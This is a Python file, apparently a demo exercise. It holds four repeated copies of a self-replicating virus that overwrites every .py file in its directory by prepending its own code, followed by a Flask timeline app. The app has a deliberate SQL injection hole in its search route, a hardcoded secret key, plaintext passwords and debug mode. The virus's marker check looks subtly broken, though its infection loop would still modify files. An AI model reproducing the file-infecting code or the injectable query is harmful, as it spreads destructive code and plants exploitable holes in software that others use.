#(VIRUS CODE)
# VIRUS SAYS HI! 
import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

# Only infect .py files
python_files = glob.glob('*.py')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!

#(VIRUS CODE)
# VIRUS SAYS HI! 
import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

# Only infect .py files
python_files = glob.glob('*.py')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!

#(VIRUS CODE)
# VIRUS SAYS HI! 
import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

# Only infect .py files
python_files = glob.glob('*.py')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!

#(VIRUS CODE)
# VIRUS SAYS HI! 
import sys
import glob

virus_code = []

with open(sys.argv[0], 'r') as f:
    lines = f.readlines()

self_replicating_part = False
for line in lines:
    if line == "# VIRUS SAYS HI!":
        self_replicating_part = True
    if not self_replicating_part:
        virus_code.append(line)
    if line == "# VIRUS SAYS BYE!\n":
        break

# Only infect .py files
python_files = glob.glob('*.py')

for file in python_files:
    with open(file, 'r') as f:
        file_code = f.readlines()

    infected = False
    for line in file_code:
        if line == "# VIRUS SAYS HI!\n":
            infected = True
            break

    if not infected:
        final_code = []
        final_code.extend(virus_code)
        final_code.extend('\n')
        final_code.extend(file_code)

        with open(file, 'w') as f:
            f.writelines(final_code)

def malicious_code():
    print("YOU HAVE BEEN INFECTED HAHAHA !!!")

malicious_code()

# VIRUS SAYS BYE!


#(FLASK APP)

import os
import sqlite3
from flask import Flask, redirect, request, session
from jinja2 import Template

app = Flask(__name__)
app.secret_key = 'sqlinjection'
DATABASE_PATH = os.path.join(os.path.dirname(__file__), 'database.db')

#(FUNGSI DATABASE)

def connect_db():
    conn = sqlite3.connect(DATABASE_PATH)
    conn.row_factory = sqlite3.Row
    return conn


def create_tables():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('''
            CREATE TABLE IF NOT EXISTS user(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                username TEXT NOT NULL UNIQUE,
                password TEXT NOT NULL
            )
        ''')
        cur.execute('''
            CREATE TABLE IF NOT EXISTS time_line(
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER NOT NULL,
                content TEXT NOT NULL,
                FOREIGN KEY(user_id) REFERENCES user(id)
            )
        ''')
        conn.commit()


def init_data():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.executemany(
            'INSERT OR IGNORE INTO user(username, password) VALUES (?, ?)',
            [('alice', 'alicepw'), ('bob', 'bobpw')]
        )
        cur.executemany(
            'INSERT OR IGNORE INTO time_line(user_id, content) VALUES (?, ?)',
            [(1, 'Hello world'), (2, 'Hi there')]
        )
        conn.commit()

#(AUTH & CRUD)

def authenticate(username, password):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'SELECT id, username FROM user WHERE username=? AND password=?',
            (username, password)
        )
        row = cur.fetchone()
        return dict(row) if row else None


def create_time_line(uid, content):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'INSERT INTO time_line(user_id, content) VALUES (?, ?)',
            (uid, content)
        )
        conn.commit()


def get_time_lines():
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute('SELECT id, user_id, content FROM time_line ORDER BY id DESC')
        return [dict(r) for r in cur.fetchall()]


def delete_time_line(uid, tid):
    with connect_db() as conn:
        cur = conn.cursor()
        cur.execute(
            'DELETE FROM time_line WHERE user_id=? AND id=?',
            (uid, tid)
        )
        conn.commit()

#(ROUTES (Flask Routes))
@app.route('/search')
def search():
    keyword = request.args.get('keyword', '')
    conn = connect_db()
    cur = conn.cursor()

    # Vulnerable to SQL injection (for demo)
    query = f"SELECT id, user_id, content FROM time_line WHERE content LIKE '%{keyword}%'"
    cur.execute(query)
    rows = [dict(r) for r in cur.fetchall()]
    conn.close()

    return Template('''
        <h2>Search Results for "{{ keyword }}"</h2>
        {% for item in results %}
            <p>ID: {{ item.id }} | User: {{ item.user_id }} | Content: {{ item.content }}</p>
        {% else %}
            <p>No results found.</p>
        {% endfor %}
        <a href="/">Back</a>
    ''').render(keyword=keyword, results=rows)

#(/init (init DB))
@app.route('/init')
def init_page():
    create_tables()
    init_data()
    return redirect('/')

#(/ (Dashboard))
@app.route('/')
def index():
    if 'uid' in session:
        tl = get_time_lines()
        return Template('''
            <html>
            <head>
                <title>Dashboard</title>
                <!-- Virus script -->
                <script>
                    console.log("YOU HAVE BEEN INFECTED HAHAHA !!!");
                </script>
            </head>
            <body>
                <h1>Dashboard</h1>
                <p>Welcome, {{ user }}</p>
                <a href="/logout">Logout</a>
                <form action="/create" method="post">
                    <input name="content" placeholder="New post" required>
                    <button type="submit">Add</button>
                </form>
                <ul>
                {% for line in tl %}
                    <li>{{ line.content }} <a href="/delete/{{ line.id }}">Delete</a></li>
                {% else %}
                    <li>No entries yet.</li>
                {% endfor %}
                </ul>
                <form action="/search" method="get">
                    <input name="keyword" placeholder="Search...">
                    <button type="submit">Search</button>
                </form>
            </body>
            </html>
        ''').render(user=session['username'], tl=tl)
    return redirect('/login')

#(/login (Login page))
@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        user = authenticate(request.form['username'], request.form['password'])
        if user:
            session['uid'] = user['id']
            session['username'] = user['username']
            return redirect('/')
    return '''
        <h2>Login</h2>
        <form method="post">
            <input name="username" placeholder="Username">
            <input name="password" type="password" placeholder="Password">
            <button type="submit">Login</button>
        </form>
    '''


@app.route('/create', methods=['POST'])
def create():
    if 'uid' in session:
        create_time_line(session['uid'], request.form['content'])
    return redirect('/')

#(/create & /delete)
@app.route('/delete/<int:tid>')
def delete(tid):
    if 'uid' in session:
        delete_time_line(session['uid'], tid)
    return redirect('/')

#(/logout)
@app.route('/logout')
def logout():
    session.clear()
    return redirect('/login')

#(RUN APP)
if __name__ == '__main__':
    app.run(debug=True)
